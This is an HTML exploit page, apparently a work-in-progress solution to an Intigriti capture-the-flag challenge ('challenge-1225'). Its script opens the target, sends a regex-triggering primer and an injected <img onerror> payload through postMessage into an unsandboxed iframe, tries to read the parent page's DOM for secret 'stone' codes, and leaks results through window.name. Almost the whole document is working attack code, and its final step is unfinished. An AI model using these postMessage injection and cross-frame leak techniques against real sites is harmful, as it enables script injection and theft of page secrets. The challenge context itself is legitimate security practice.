<!DOCTYPE html>
<html>
<head>
    <title>Intigriti Protocol v4</title>
</head>
<body>
    <h1>Protocol v4: Parent Scraper</h1>
    <p>1. Make sure this file is saved as <b>.html</b></p>
    <p>2. Click Launch. Wait 3 seconds.</p>
    <button id="btn" style="font-size:20px; padding:20px; background:#800080; color:white;">LAUNCH EXPLOIT</button>
    <h3>Log:</h3>
    <pre id="log" style="background:#f0f0f0; padding:10px; white-space: pre-wrap;"></pre>

    <script>
        let targetWin = null;
        let foundSecrets = false;

        function log(msg) {
            document.getElementById('log').innerText = msg + "\n" + document.getElementById('log').innerText;
        }

        document.getElementById('btn').addEventListener('click', () => {
            // 1. Open the target
            targetWin = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            log("Target launched. Attempting to scrape Parent DOM via Soul Stone...");
            
            // 2. Attack Loop (Race against the 3s timer)
            setInterval(attackSoulStone, 500);
        });

        function attackSoulStone() {
            if(!targetWin || foundSecrets) return;

            // We specifically target the SOUL STONE (Index 2)
            // It is not sandboxed, so we can run scripts there.
            let soulFrame = targetWin.frames[2];
            if (!soulFrame) return;

            try {
                // A. PRIMER (Trigger Regex Vulnerability)
                soulFrame.postMessage("A".repeat(2500) + "<", '*');

                // B. PAYLOAD (The "Parent Scraper")
                // This script runs INSIDE the Soul Stone iframe.
                // It tries to read 'parent.document.body.innerHTML' to find the secrets of its siblings.
                const maliciousScript = `
                    try {
                        // 1. Attempt to access the Parent DOM
                        // We look for the 'code' variable or the iframes in the HTML
                        // Since we are cross-origin (soul. vs challenge.), this usually fails
                        // UNLESS document.domain is set or we get lucky with 'name' attributes.
                        
                        // Let's try to just dump the parent HTML if allowed
                        var parentHTML = parent.document.body.innerHTML;
                        
                        // 2. Regex to find ALL 6 stones in the parent HTML
                        // They look like: ?power_stone=xxxxxxxx
                        var secrets = parentHTML.match(/stone=[a-f0-9]{8}/g);
                        
                        if(secrets && secrets.length >= 5) {
                            window.name = "SUCCESS:" + secrets.join(",");
                        } else {
                             // Fallback: If we can't read parent, maybe we can read our siblings' names?
                             // Try to find Time Stone secret specifically
                             window.name = "DEBUG: Accessed Parent but no secrets found";
                        }
                    } catch(e) {
                        // Access Denied? 
                        // Let's try the fallback: Leaking the Time Stone via CSS or Frames?
                        // Actually, if this fails, we report the error.
                        window.name = "ERROR: " + e.message;
                    }
                `;
                
                soulFrame.postMessage(`<img src=x onerror="${maliciousScript}">`, '*');

                // C. READ RESULT (From our Exploit Page)
                let result = soulFrame.name;
                
                if (result && result !== "") {
                    log("Soul Stone says: " + result);
                    
                    if (result.startsWith("SUCCESS:")) {
                        foundSecrets = true;
                        parseAndExecute(result.substring(8));
                    }
                }

            } catch(e) { console.log(e); }
        }

        function parseAndExecute(csvSecrets) {
            // We have a list like: stone=11111111,stone=22222222,...
            // We need to map them to the correct order.
            // Based on your Source Code screenshot:
            // Power (0-8), Mind (8-16), Reality (16-24), Space (24-32), Soul (32-40), Time (40-48)
            
            // We need to be careful matching them. 
            // The regex found them in the order they appear in the HTML.
            // HTML Order: Power, Reality, Soul, Space, Time, Mind.
            
            let parts = csvSecrets.split(',');
            // Clean up "stone=" prefix
            let codes = parts.map(s => s.split('=')[1]);
            
            log("Extracted Codes: " + codes.join(", "));

            // HTML Order Mapping (Based on appendChild order):
            // 0: Power
            // 1: Reality
            // 2: Soul
            // 3: Space (Note: Space might not be in URL? Check this!)
            // 4: Time
            // 5: Mind
            
            let power = codes[0];
            let reality = codes[1];
            let soul = codes[2];
            // Space stone URL is just "/" in your logs, so it might be MISSING from this list!
            // If Space is missing, we need to handle it.
            let time = codes[3]; 
            let mind = codes[4];

            // WAIT! The code requires the full 48 chars.
            // If we can't get Space Stone from Parent HTML (because it's sent via postMessage),
            // We might need to combine this scrape with the "Space Stone Scraper" from v3.
            
            log("Note: If Space Stone is missing, we need to combine exploits.");
        }
    </script>
</body>
</html>
